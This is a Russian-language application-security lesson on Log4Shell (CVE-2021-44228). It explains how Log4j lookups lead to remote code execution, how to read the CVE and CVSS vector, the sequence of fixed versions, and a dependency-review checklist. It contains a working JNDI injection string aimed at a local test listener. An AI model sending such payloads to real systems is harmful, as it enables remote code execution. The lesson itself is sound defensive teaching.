# JNDI-инъекции и Log4Shell как показательный кейс

Уровень **L2** · время 25 мин (теория 15 / задача 6 / самопроверка 4,
оценка)

Что прочитать сначала: `java-deserialization-gadgets`, `cve-cvss`.

Приложение журналирует вход пользователя через Log4j. На порту 1389
поднят слушатель, который печатает факт подключения. Прогон одной и той
же строки журнала на двух версиях log4j-core:

```text
# log4j-core 2.14.1
ERROR LogDemo - Вход пользователя: ${jndi:ldap://127.0.0.1:1389/Exploit}
# слушатель: ПОДКЛЮЧЕНИЕ от ('127.0.0.1', 41424)

# log4j-core 2.16.0 — та же строка, та же программа
# слушатель: за 20 секунд подключений не было
```

Строка в журнал записалась как текст в обоих случаях. Но на уязвимой
версии библиотека перед записью выполнила лукап: разобрала `${jndi:...}`,
обратилась по сети к «серверу» из строки. Это и есть Log4Shell,
CVE-2021-44228: настоящий сервер вместо слушателя ответил бы ссылкой на
класс, и класс был бы загружен и исполнен. Класс в реестре —
CWE-917 (каталог Common Weakness Enumeration), внедрение выражения.

Дальше: как строка журнала стала точкой исполнения, что чинили три
версии подряд и как читается запись об этом кейсе.

## 0. Коротко

То же в терминах, которыми это обсуждают. В log4j-core до 2.15.0 строки
журнала разбирались на лукапы вида `${jndi:ldap://...}`: библиотека ходила
по адресу и подгружала оттуда класс — отсюда удалённое исполнение кода.
Уязвимы версии с 2.0-beta9 по 2.15.0 включительно — так диапазон
сформулирован в записи CVE; исключения — выпуски безопасности 2.3.1
(Java 6), 2.12.2 и 2.12.3 (ветка Java 7). Починка шла цепочкой: 2.15.0
ограничила JNDI-лукапы по умолчанию, 2.16.0 удалила подстановку из
сообщений журнала, 2.17.0 и 2.17.1 закрыли найденные следом обходы.

Запись NVD оценивает кейс в 10.0 по CVSS 3.1 — максимум по всем шкалам
сетевой атаки без условий. Для ревью
урок один: контроль над тем, что попадает в журнал, — это контроль над
входом в библиотеку.

**Зачем это в работе AppSec-инженера.** Это эталонный кейс сразу трёх
дисциплин: чтения записи CVE, ревизии дерева зависимостей и ревью кода,
журналирующего чужой ввод. Вопрос «какая у нас версия log4j» в декабре
2021 отвечался в каждой компании за часы, и отвечался он деревом
зависимостей, а не списком из package-файла.

## 3. Механика

**Откуда это взялось.** Лукапы в Log4j появились как подстановка без кода:
в строку журнала писали `${sys:user.name}` и получали значение без кода.
Механизм оказался общим: среди лукапов был и JNDI — интерфейс Java к
службам каталогов, умеющий по адресу получить объект. Наивное решение
«строка журнала — это текст» ломается о то, что текст для библиотеки —
язык. Класс гаджета из темы `java-deserialization-gadgets` здесь
прямой: подгруженный по сети класс исполняется при загрузке.

Цепочка внутри вызова идёт через четыре звена: обработчик
журналирует ввод, логер разбирает строку на лукапы, JNDI обращается к
LDAP по адресу из строки. Ответ ссылается на класс — и класс загружается
и исполняется. Граница доверия
сломана в первом звене: ввод пользователя дошёл до интерпретатора
библиотеки. Все дальнейшие звенья — честная работа механизмов. Каждый
делал ровно то, что в нём записано.

Запись CVE читается по частям (навык из темы `cve-cvss`). Вектор
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H говорит: сетевой вход,
низкая сложность, без прав и без участия пользователя, с выходом за
скоуп и полным эффектом по трём свойствам. Описание называет условие:
возможность контролировать строки журнала. Страница безопасности проекта
добавляет то, чего у записи нет, — точные диапазоны уязвимых и
исправленных версий и историю починки.

## 5. Как выглядит в коде

Сам дефектный код выглядит невинно — этим кейс и страшен:

```java
// УЯЗВИМО при уязвимой версии библиотеки — демонстрация
private static final Logger log = LogManager.getLogger(Demo.class);

public void login(String username) {
    log.error("Вход пользователя: {}", username);  // (1)
}
```

1. Строка из запроса попадает в журнал. Дефект не в этой строке, а в
   версии библиотеки под ней: ревьюер читает код и дерево зависимостей
   вместе.

Признаки в дереве: log4j-core уязвимых версий (с log4j-api без core
кейс не срабатывает — страница проекта подчёркивает это явно). Дальше:
ветки 2.15.0–2.16.x с известными добивками и транзитивно подтянутый
log4j через промежуточную библиотеку. Обратная находка — устаревший Log4j 1.x:
лукапов в нём нет, но он не поддерживается с 2015 года, и свои кейсы у
него есть.

## 6. Как чинится

Правило одно: версия библиотеки — из исправленных веток, и это видно в
дереве зависимостей, а не в надежде.

Цепочка починок по странице проекта. Версия 2.15.0 ограничила
JNDI-лукапы по умолчанию. Версия 2.16.0 удалила подстановку из сообщений
журнала и закрыла обход первой починки — CVE-2021-45046 в
неумолчательных конфигурациях. Версии 2.17.0 и 2.17.1 закрыли найденные
следом CVE-2021-45105 (бесконечная рекурсия лукапов) и CVE-2021-44832
(JNDI-источник данных в JDBC-appender, ограничен протоколом java). Прогон из введения подтверждает итог: на 2.16.0 та же строка
не вызывает ни одного подключения.

Второй слой — вход: журналируемый ввод не должен нести управляющих
конструкций библиотеки. Это работает как мера в глубину: у уже обновлённой
библиотеки лукапа нет, а у завтрашней уязвимости другого логера — может
быть.

**Когда канон не подходит.** Обновление версии в корпоративном
монолите — не мгновенное действие. Исторические меры того декабря —
свойства, отключающие подстановку, снятие класса лукапа из архива —
существовали именно для окна до обновления. Ответ на такое окно — изоляция и
фильтрация исходящих соединений сервиса: лукап без сети — текст.

## 9. Ловушка

Встречается рассуждение: «мы обновились на 2.15.0 — первую исправленную,
мы закрыты».

**Первая исправленная версия — не точка, а начало цепочки.** Механизм
из раздела о механике: 2.15.0 ограничила лукапы по умолчанию, и уже
через дни CVE-2021-45046 показал обход в конфигурациях не по умолчанию.
Чтение страницы проекта диапазонами видно прямо в записях: у каждой
следующей CVE своё «исправлено в».

Контрпример — сама цепочка: 2.15.0, 2.16.0, 2.17.0, 2.17.1 вышли за
две недели. Ревизия, остановившаяся на первом номере, трижды оставалась
позади.

## 10. Чеклист ревью

1. Verify that версия log4j-core в дереве зависимостей не попадает в
   уязвимые диапазоны записи CVE-2021-44228 (CWE-917).
2. Verify that log4j не приехал транзитивно через промежуточную
   библиотеку: дерево смотрится целиком, а не прямые зависимости.
3. Verify that применённая версия — из конца цепочки починок, а не из
   её начала.
4. Verify that журналируемый ввод не несёт конструкций `${...}` — мера
   в глубину на будущие лукапы.
5. Verify that исходящие соединения сервиса ограничены сетевым периметром:
   лукап куда попало не пройдёт.
6. Verify that в записи ревизии зафиксированы и версия библиотеки, и
   источник сверки диапазонов (навык из темы `cve-cvss`).

## 11. Задача

Возьмите свой Java-проект (или чужой открытый) и найдите в нём log4j-core:
деревом зависимостей сборщика, поиском по имени архива, поиском класса в
собранном артефакте. Сверьте найденное с диапазонами на странице
безопасности проекта.

Одна подсказка: уязвима именно log4j-core; присутствие одного log4j-api
без core кейс не составляет — это написано на странице проекта.

**Критерий выполнения** наблюдаемый: список «где встретился log4j-core —
какая версия — вне диапазона или внутри», включая транзитивные вхождения.

## 12. Проверь себя

1. Как строка журнала на уязвимой версии становится обращением по сети?
2. Что сделала версия 2.15.0 и почему её оказалось мало?
3. Какие четыре свойства вектора CVSS делают кейс сетевой атакой без
   условий, и где они записаны?
4. Почему ревью читают по дереву зависимостей, а не по списку прямых?
5. Возврат к теме `java-deserialization-gadgets`: чем загрузка класса по
   сети родственна разбору чужого потока?

<details markdown="1">
<summary>Ответы</summary>

1. Логер разбирает строку на лукапы `${...}`; JNDI-лукап обращается по
   адресу из строки и получает ссылку на класс, который загружается и
   исполняется.
2. Она ограничила JNDI-лукапы по умолчанию. Обход в неумолчательных
   конфигурациях закрыла 2.16.0, удалившая подстановку из сообщений, а
   рекурсию лукапов — 2.17.0.
3. AV:N — сеть, AC:L — низкая сложность, PR:N — без прав, UI:N — без
   участия пользователя; вектор записан в записи CVE в NVD.
4. Потому что уязвимая библиотека чаще приезжает транзитивно; прямой
   список её не показывает.
5. Обе доверяют вводу рецепт восстановления или загрузки кода: ввод
   выбирает, какой класс исполнится. Разница в точке входа: поток байт
   против строки текста.

</details>

## 13. Источники

1. Security, Apache Logging Services; реестр `log4j-security`. Разделы:
   записи CVE-2021-44228, CVE-2021-45046, CVE-2021-45105 и
   CVE-2021-44832: диапазоны уязвимых и исправленных версий, условия и
   митигации; примечание о log4j-api без log4j-core и о Log4j 1.
   <https://logging.apache.org/security.html>
2. CVE-2021-44228, запись NVD; реестр `nvd-cve-2021-44228`. Разделы:
   описание (лукапы в сообщениях и параметрах, исполнение класса с
   LDAP-сервера), вектор CVSS 3.1 и оценка 10.0, ссылки CWE.
   <https://nvd.nist.gov/vuln/detail/CVE-2021-44228>

Каркас этапа: у этапа 7 общих унаследованных источников нет; каждая тема
опирается на документацию своего языка и на материалы этапа 1 по
классам дефектов.

**Скоропортящийся слой.** Диапазоны версий и цепочка починок зафиксированы
и стабильны как история; скоропортящееся здесь — список смежных CVE на
странице проекта, который растёт, и состояние веток Log4j 1. При ревизии
перечитывается страница Apache Logging целиком.

**Маркеры уверенности.** **Проверено лично** 2026-09-02 на OpenJDK
17.0.20.1: программа с log4j-core 2.14.1 и строкой
`${jndi:ldap://127.0.0.1:1389/Exploit}` вызвала подключение к слушателю
(порт 1389, локальный TCP-приёмник), а та же программа с log4j-core
2.16.0 — нет (за 20 секунд подключений не было). Полная цепочка с
загрузкой чужого класса не воспроизводилась: это потребовало бы
LDAP-сервера с reference-ответом; показан исходящий лукап — первое звено
цепочки. Диапазоны версий, цепочка починок и состав CVE — **по странице
Apache Logging**, открытой лично 2026-09-02. Вектор CVSS и описание — по
записи NVD: веб-страница отвечает автоматическому клиенту JS-проверкой,
содержание сверено через официальный API NVD в тот же день.
